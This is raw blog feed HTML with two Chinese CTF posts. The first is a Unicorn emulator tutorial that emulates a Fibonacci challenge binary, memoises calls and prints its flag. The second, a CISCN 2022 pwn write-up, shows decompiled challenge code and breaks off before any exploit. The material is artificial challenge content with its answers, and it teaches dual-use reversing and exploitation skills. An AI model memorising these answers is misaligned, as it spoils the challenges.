function_">u32</span>(<span class="params">data</span>):<span class="comment"># 解包数据</span></span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&quot;I&quot;</span>,data)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p32</span>(<span class="params">num</span>):<span class="comment"># 打包数据</span></span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;I&quot;</span>,num)</span><br></pre></td></tr></table></figure><p>记住<code>python3</code>下二进制文件的打开形式为<strong>‘rb’</strong>，否则会报如下错误：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UnicodeDecodeError: <span class="string">&#x27;utf-8&#x27;</span> codec can<span class="string">&#x27;t decode byte 0x90 in position 24: invalid start byte</span></span><br></pre></td></tr></table></figure><p>首先实例化一个基于<code>X86</code>架构的模式为<code>64位</code>的模拟器：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mu = Uc(UC_ARCH_X86, UC_MODE_64)<span class="comment"># 其他架构和模式详见文档</span></span><br></pre></td></tr></table></figure><p>接着开辟两段空间，一段用于储存程序代码，另一段用于模拟栈，申请大小均为1024<em>1024(即*<em>1MB</em></em>)：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">prog_base = <span class="number">0x400000</span><span class="comment"># 初始空间地址</span></span><br><span class="line">prog_size = <span class="number">1024</span>*<span class="number">1024</span><span class="comment"># 空间大小</span></span><br><span class="line">stack_base = <span class="number">0x0</span><span class="comment"># 初试栈地址</span></span><br><span class="line">stack_size = <span class="number">1024</span>*<span class="number">1024</span><span class="comment"># 栈大小</span></span><br><span class="line"></span><br><span class="line">mu.mem_map(prog_base, prog_size)<span class="comment"># 申请(映射) 1MB 内存用于存放程序</span></span><br><span class="line">mu.mem_map(stack_base, stack_size)<span class="comment"># 申请(映射) 1MB 内存用于存放栈</span></span><br><span class="line"></span><br><span class="line">mu.mem_write(prog_base, read_file(<span class="string">&quot;./fibonacci&quot;</span>))<span class="comment"># 写入程序</span></span><br><span class="line">mu.reg_write(UC_X86_REG_RSP, stack_base+stack_size-<span class="number">1</span>)<span class="comment"># 修改RSP指针</span></span><br></pre></td></tr></table></figure><p>设置程序的加载地址和结束地址，分别为<code>0x4004E0</code>和<code>0x400575</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">start = <span class="number">0x4004E0</span></span><br><span class="line">end = <span class="number">0x400575</span></span><br><span class="line">mu.emu_start(start, end)<span class="comment"># 从start开始执行直至end</span></span><br></pre></td></tr></table></figure><p>我们运行一下脚本，发现报错，说是读到非法的地址：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;try.py&quot;</span>, line 28, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    mu.emu_start(start, end)</span><br><span class="line">  File <span class="string">&quot;/home/fuzz/.local/lib/python3.8/site-packages/unicorn/unicorn.py&quot;</span>, line 525, <span class="keyword">in</span> emu_start</span><br><span class="line">    raise UcError(status)</span><br><span class="line">unicorn.unicorn.UcError: Invalid memory <span class="built_in">read</span> (UC_ERR_READ_UNMAPPED)</span><br></pre></td></tr></table></figure><p>那么是走到哪一步报错了呢？我们需要添加<code>hook</code>将成功执行的代码和其<strong>大小</strong>给打印出来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&#x27;</span> %(address, size))</span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)<span class="comment"># 添加了hook后每执行一句代码就会执行hook_code内的操作</span></span><br></pre></td></tr></table></figure><p>再次运行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/unicorn-ctf$ python3 try.py </span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e0, instruction size = 0x1</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e1, instruction size = 0x1</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e2, instruction size = 0x2</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e4, instruction size = 0x5</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004e9, instruction size = 0x2</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004eb, instruction size = 0x4</span><br><span class="line">&gt;&gt;&gt; Tracing instruction at 0x4004ef, instruction size = 0x7</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;try.py&quot;</span>, line 34, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    mu.emu_start(start, end)</span><br><span class="line">  File <span class="string">&quot;/home/fuzz/.local/lib/python3.8/site-packages/unicorn/unicorn.py&quot;</span>, line 525, <span class="keyword">in</span> emu_start</span><br><span class="line">    raise UcError(status)</span><br><span class="line">unicorn.unicorn.UcError: Invalid memory <span class="built_in">read</span> (UC_ERR_READ_UNMAPPED)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>可以得知，程序在执行如下<code>code</code>报错：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004004EF                 mov     rdi, cs:stdout  ; stream</span><br></pre></td></tr></table></figure><p>因为我们未在空间里引入<code>glibc</code>，所以直接跳过这些函数就好了，除此之外还需跳过的<code>code</code>有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004004F6                 call    _setbuf</span><br><span class="line">.text:0000000000400502                 call    _printf</span><br><span class="line">.text:000000000040054F                 mov     rsi, cs:stdout  ; fp</span><br></pre></td></tr></table></figure><p>可以通过改写<code>rip</code>进行跳过：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mu.reg_write(UC_X86_REG_RIP, address+size)</span><br></pre></td></tr></table></figure><p>当然我们对打印函数也应当进行处理：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:0000000000400558                 movsx   edi, dil        ; c</span><br><span class="line">.text:000000000040055C                 add     rbp, 1</span><br><span class="line">.text:0000000000400560                 call    __IO_putc</span><br></pre></td></tr></table></figure><p><code>__IO_putc</code>将寄存器<code>rdi</code>内的元素进行输出，我们可以对其进行改写：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">c = mu.reg_read(UC_X86_REG_RDI)<span class="comment"># 读出 rdi 里的值进行打印</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">chr</span>(c))</span><br><span class="line">mu.reg_write(UC_X86_REG_RIP, address+size)</span><br></pre></td></tr></table></figure><p>因此<code>hook_code</code>有：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">instructions_skip_list = [<span class="number">0x4004EF</span>,<span class="number">0x4004F6</span>,<span class="number">0x400502</span>,<span class="number">0x40054F</span>]<span class="comment"># 跳过glibc函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="comment">#print(&#x27;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&#x27; %(address, size))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> address <span class="keyword">in</span> instructions_skip_list:</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br><span class="line">    <span class="keyword">elif</span> address == <span class="number">0x400560</span>:<span class="comment"># 执行到__IO_putc便打印rdi的值，并跳过</span></span><br><span class="line">        c = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(c))</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br></pre></td></tr></table></figure><p>再次执行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/unicorn-ctf$ python3 try.py </span><br><span class="line">h</span><br><span class="line">x</span><br><span class="line">p</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们发现打印<code>flag</code>依旧很慢，因此就需要开始我们的优化工作</p><h3 id="2-优化程序，提高速度"><a href="#2-优化程序，提高速度" class="headerlink" title="2. 优化程序，提高速度"></a>2. 优化程序，提高速度</h3><p>很显然许多参数以及返回值一样的<code>FIB</code>函数被重复调用了多次，因此我们需要对这些被重复调用过的函数进行记录，当参数一样时，不再经过中间的计算，而直接给出返回值。</p><p>如何保存这些成对的值？</p><ul><li>在函数开始的时候，我们可以检查参数对应的值是否已经被dict记录<ul><li>如果是，直接返回这个key-value就行，只需将返回值写入到<code>RAX</code>中，同时设置<code>RIP</code>为<code>RET</code>指令的值，退出这个函数。不能在<code>fabonacci</code>函数内直接跳转到<code>RET</code>，因为这条指令已经被HOOK了，所以我们跳转到<code>main</code>中的<code>ret</code>。</li><li>如果dict中没有出现参数和对应的值，将参数添加到dict中。</li></ul></li><li>当退出函数的时候，保存返回值。可以从我们的栈结构中读取参数和返回值。</li></ul><p>因此我们需要在执行到<code>FIB</code>函数时进行判断，在<code>FIB</code>返回的时候进行更新，构造如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">Fib_entry = <span class="number">0x400670</span></span><br><span class="line">Fib_return = [<span class="number">0x4006F1</span>, <span class="number">0x400709</span>]</span><br><span class="line"></span><br><span class="line">stack = []</span><br><span class="line">d = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="comment">#print(&#x27;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&#x27; %(address, size))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> address <span class="keyword">in</span> instructions_skip_list:</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br><span class="line">    <span class="keyword">elif</span> address == <span class="number">0x400560</span>:</span><br><span class="line">        c = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(c))</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br><span class="line">    <span class="keyword">elif</span> address == Fib_entry:</span><br><span class="line">        arg0 = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line">        r_rsi = mu.reg_read(UC_X86_REG_RSI)</span><br><span class="line">        arg1 = u32(mu.mem_read(r_rsi,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (arg0,arg1) <span class="keyword">in</span> d:</span><br><span class="line">            (ret_rax, ret_ref) = d[(arg0,arg1)]</span><br><span class="line">            mu.reg_write(UC_X86_REG_RAX, ret_rax)</span><br><span class="line">            mu.mem_write(r_rsi, p32(ret_ref))</span><br><span class="line">            mu.reg_write(UC_X86_REG_RIP,<span class="number">0x400582</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            stack.append((arg0,arg1,r_rsi))</span><br><span class="line">    <span class="keyword">elif</span> address <span class="keyword">in</span> Fib_return:</span><br><span class="line">        (arg0, arg1, r_rsi) = stack.pop()</span><br><span class="line">        ret_rax = mu.reg_read(UC_X86_REG_RAX)</span><br><span class="line">        ret_ref = u32(mu.mem_read(r_rsi,<span class="number">4</span>))</span><br><span class="line">        d[(arg0, arg1)] = (ret_rax, ret_ref)</span><br></pre></td></tr></table></figure><p>再次运行脚本：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">fuzz@fuzz-virtual-machine:~/unicorn-ctf$ python3 exp.py </span><br><span class="line">h</span><br><span class="line">x</span><br><span class="line">p</span><br><span class="line">&#123;</span><br><span class="line">F</span><br><span class="line">1</span><br><span class="line">b</span><br><span class="line">0</span><br><span class="line">n</span><br><span class="line">4</span><br><span class="line">c</span><br><span class="line">C</span><br><span class="line">i</span><br><span class="line">_</span><br><span class="line">n</span><br><span class="line">u</span><br><span class="line">m</span><br><span class="line">Z</span><br><span class="line">_</span><br><span class="line">4</span><br><span class="line">r</span><br><span class="line">3</span><br><span class="line">_</span><br><span class="line">T</span><br><span class="line">0</span><br><span class="line">O</span><br><span class="line">_</span><br><span class="line">3</span><br><span class="line">a</span><br><span class="line">5</span><br><span class="line">Y</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="3-完整EXP"><a href="#3-完整EXP" class="headerlink" title="3. 完整EXP"></a>3. 完整EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> unicorn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> unicorn.x86_const <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">read_file</span>(<span class="params">name</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(name,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">u32</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.unpack(<span class="string">&quot;I&quot;</span>,data)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">p32</span>(<span class="params">num</span>):</span><br><span class="line">    <span class="keyword">return</span> struct.pack(<span class="string">&quot;I&quot;</span>,num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">mu = Uc(UC_ARCH_X86, UC_MODE_64)</span><br><span class="line"></span><br><span class="line">prog_base = <span class="number">0x400000</span></span><br><span class="line">stack_base = <span class="number">0x0</span></span><br><span class="line">stack_size = <span class="number">1024</span>*<span class="number">1024</span></span><br><span class="line"></span><br><span class="line">mu.mem_map(prog_base, <span class="number">1024</span>*<span class="number">1024</span>)</span><br><span class="line">mu.mem_map(stack_base, stack_size)</span><br><span class="line"></span><br><span class="line">mu.mem_write(prog_base, read_file(<span class="string">&quot;./fibonacci&quot;</span>))</span><br><span class="line">mu.reg_write(UC_X86_REG_RSP, stack_base+stack_size-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">start = <span class="number">0x4004E0</span></span><br><span class="line">end = <span class="number">0x400575</span></span><br><span class="line"></span><br><span class="line">instructions_skip_list = [<span class="number">0x4004EF</span>,<span class="number">0x4004F6</span>,<span class="number">0x400502</span>,<span class="number">0x40054F</span>]</span><br><span class="line"></span><br><span class="line">Fib_entry = <span class="number">0x400670</span></span><br><span class="line">Fib_return = [<span class="number">0x4006F1</span>, <span class="number">0x400709</span>]</span><br><span class="line"></span><br><span class="line">stack = []</span><br><span class="line">d = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hook_code</span>(<span class="params">mu, address, size, user_data</span>):</span><br><span class="line">    <span class="comment">#print(&#x27;&gt;&gt;&gt; Tracing instruction at 0x%x, instruction size = 0x%x&#x27; %(address, size))</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> address <span class="keyword">in</span> instructions_skip_list:</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br><span class="line">    <span class="keyword">elif</span> address == <span class="number">0x400560</span>:</span><br><span class="line">        c = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">chr</span>(c))</span><br><span class="line">        mu.reg_write(UC_X86_REG_RIP, address+size)</span><br><span class="line">    <span class="keyword">elif</span> address == Fib_entry:</span><br><span class="line">        arg0 = mu.reg_read(UC_X86_REG_RDI)</span><br><span class="line">        r_rsi = mu.reg_read(UC_X86_REG_RSI)</span><br><span class="line">        arg1 = u32(mu.mem_read(r_rsi,<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (arg0,arg1) <span class="keyword">in</span> d:</span><br><span class="line">            (ret_rax, ret_ref) = d[(arg0,arg1)]</span><br><span class="line">            mu.reg_write(UC_X86_REG_RAX, ret_rax)</span><br><span class="line">            mu.mem_write(r_rsi, p32(ret_ref))</span><br><span class="line">            mu.reg_write(UC_X86_REG_RIP,<span class="number">0x400582</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            stack.append((arg0,arg1,r_rsi))</span><br><span class="line">    <span class="keyword">elif</span> address <span class="keyword">in</span> Fib_return:</span><br><span class="line">        (arg0, arg1, r_rsi) = stack.pop()</span><br><span class="line">        ret_rax = mu.reg_read(UC_X86_REG_RAX)</span><br><span class="line">        ret_ref = u32(mu.mem_read(r_rsi,<span class="number">4</span>))</span><br><span class="line">        d[(arg0, arg1)] = (ret_rax, ret_ref)</span><br><span class="line"></span><br><span class="line">mu.hook_add(UC_HOOK_CODE, hook_code)</span><br><span class="line">mu.emu_start(start, end)</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;结合 ctf赛题 学习一下 unicorn 引擎的基础使用。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://bbs.pediy.com/thread-224330.htm#msg_header_h3_1&quot;&gt;参考文章&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://github.com/kabeor/Unicorn-Engine-Documentation/blob/master/Unicorn-Engine%20Documentation.md&quot;&gt;unicorn中文文档&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="other" scheme="http://example.com/categories/other/"/>
    
    
  </entry>
  
  <entry>
    <title>ciscn2022</title>
    <link href="http://example.com/2022/05/30/ciscn2022/"/>
    <id>http://example.com/2022/05/30/ciscn2022/</id>
    <published>2022-05-30T03:41:37.000Z</published>
    <updated>2023-01-18T08:54:33.015Z</updated>
    
    <content type="html"><![CDATA[<p>考研选手来摸鱼。</p><p>今年国赛菜得很快乐，趟得也很快乐~</p><span id="more"></span><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><p>吐槽：相比于去年啥都不会(当时连堆都没接触过)，今年终于做出题了，虽然不是堆题。堆的 libc 更新太快了，我连 2.27 都没搞明白，2.33、2.34的就来了（老人疑惑</p><h3 id="login-normal"><a href="#login-normal" class="headerlink" title="login_normal"></a>login_normal</h3><p>保护全开。这道题分析好代码就会写了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(__int64 a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">1032</span>]; <span class="comment">// [rsp+0h] [rbp-410h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+408h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init_();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x400</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt;&gt; &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, s, <span class="number">0x3FF</span>uLL);</span><br><span class="line">    menu(s);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是<code>main</code>函数，就是一个循环，读入输入，看不出啥名堂，进入<code>menu</code>看看。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">menu</span><span class="params">(_BYTE *our_input)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *sa; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sb; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sc; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> *sd; <span class="comment">// [rsp+8h] [rbp-48h]</span></span><br><span class="line">  <span class="type">char</span> v7; <span class="comment">// [rsp+17h] [rbp-39h]</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// [rsp+1Ch] [rbp-34h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [rsp+2Ch] [rbp-24h]</span></span><br><span class="line">  <span class="type">void</span> *dest; <span class="comment">// [rsp+30h] [rbp-20h]</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [rsp+38h] [rbp-18h]</span></span><br><span class="line">  <span class="type">char</span> *nptr; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+48h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(qword_202040, <span class="number">0</span>, <span class="keyword">sizeof</span>(qword_202040));</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  dest = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">while</span> ( !*our_input || *our_input != <span class="number">0xA</span> &amp;&amp; (*our_input != <span class="number">13</span> || our_input[<span class="number">1</span>] != <span class="number">10</span>) )  <span class="comment">//遇&#x27;\n&#x27;跳出</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v8 &lt;= <span class="number">5</span> )                              <span class="comment">// 6次机会read</span></span><br><span class="line">      qword_202040[<span class="number">2</span> * v8] = our_input;</span><br><span class="line">    sb = <span class="built_in">strchr</span>(our_input, <span class="string">&#x27;:&#x27;</span>);                <span class="comment">// 寻找&#x27;:&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> ( !sb )                                  <span class="comment">// 找不到就报错</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;error.&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span 